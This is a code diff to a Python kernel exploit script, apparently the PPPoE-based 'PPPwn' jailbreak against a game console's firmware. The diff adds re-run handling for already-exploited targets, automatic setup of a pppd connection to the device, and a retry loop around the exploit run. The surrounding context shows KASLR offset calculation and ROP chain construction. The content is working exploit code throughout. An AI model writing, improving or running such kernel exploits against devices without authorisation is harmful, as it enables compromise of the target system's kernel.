@@ -13,6 +13,13 @@ from sys import exit
 from time import sleep
 from offsets import *
 
+import os
+import sys
+SCRIPT_DIR = os.path.dirname(os.path.abspath(__file__))
+sys.path.append(os.path.dirname(SCRIPT_DIR))
+
+from python_pppd.pppd import PPPConnection
+
 # PPPoE constants
 
 PPPOE_TAG_HUNIQUE = 0x0103
@@ -177,6 +184,7 @@ class Exploit():
         self.stage1 = stage1
         self.stage2 = stage2
         self.s = conf.L2socket(iface=self.iface, filter=self.BPF_FILTER)
+        self.ppp = None
 
     def kdlsym(self, addr):
         return self.kaslr_offset + addr
@@ -279,15 +287,19 @@ class Exploit():
             if tag.tag_type == PPPOE_TAG_HUNIQUE:
                 host_uniq = tag.tag_value
 
-        self.pppoe_softc = unpack('<Q', host_uniq)[0]
-        print('[+] pppoe_softc: {}'.format(hex(self.pppoe_softc)))
+        if len(host_uniq) != 8:
+            print('[+] already PPPwned!')
+            self.pppoe_softc = None
+        else:
+            self.pppoe_softc = unpack('<Q', host_uniq)[0]
+            print('[+] pppoe_softc: {}'.format(hex(self.pppoe_softc)))
 
         self.target_mac = pkt[Ether].src
         print('[+] Target MAC: {}'.format(self.target_mac))
 
-        self.source_mac = self.SOURCE_MAC
+        self.source_mac = get_if_hwaddr(self.iface)
 
-        if cb:
+        if cb and self.pppoe_softc:
             ac_cookie = cb()
         else:
             ac_cookie = b''
@@ -313,7 +325,7 @@ class Exploit():
             Ether(src=self.source_mac,
                   dst=self.target_mac,
                   type=ETHERTYPE_PPPOEDISC) /
-            PPPoED(code=PPPOE_CODE_PADS, sessionid=self.SESSION_ID) /
+            PPPoED(code=PPPOE_CODE_PADS, sessionid=(self.SESSION_ID if self.pppoe_softc else 1)) /
             PPPoETag(tag_type=PPPOE_TAG_HUNIQUE, tag_value=host_uniq))
 
     def build_fake_ifnet(self):
@@ -610,6 +622,11 @@ class Exploit():
 
         return rop
 
+    def stop_pppd(self):
+        if self.ppp:
+            self.ppp.disconnect()
+            self.ppp = None
+
     def run(self):
         lcp_echo_handler = LcpEchoHandler(self.iface)
         lcp_echo_handler.start()
@@ -618,6 +635,18 @@ class Exploit():
         print('[+] STAGE 0: Initialization')
 
         self.ppp_negotation(self.build_fake_ifnet, True)
+        if self.pppoe_softc is None:
+            self.stop_pppd()
+            self.ppp = PPPConnection(
+                    'noauth', 'noaccomp', 'nopcomp', 'default-asyncmap', 'debug',
+                    '10.0.0.1:10.67.15.1',
+                    sudo=False,
+                    pty=f'/usr/sbin/pppoe -n -I {self.iface} -e 1:{self.target_mac}',
+                    mru='1492', mtu='1492'
+            )
+            print('[+] PPPoE connection established!')
+            return
+
         self.lcp_negotiation()
         self.ipcp_negotiation()
 
@@ -747,7 +776,7 @@ class Exploit():
 
         if not corrupted:
             print('[-] Scanning for corrupted object...failed. Please retry.')
-            exit(1)
+            return
 
         print(
             '[+] Scanning for corrupted object...found {}'.format(source_ipv6))
@@ -870,7 +899,12 @@ def main():
         offs = OffsetsFirmware_1100()
 
     exploit = Exploit(offs, args.interface, stage1, stage2)
-    exploit.run()
+    try:
+        while True:
+            exploit.run()
+    except:
+        exploit.stop_pppd()
+        raise
 
     return 0
 
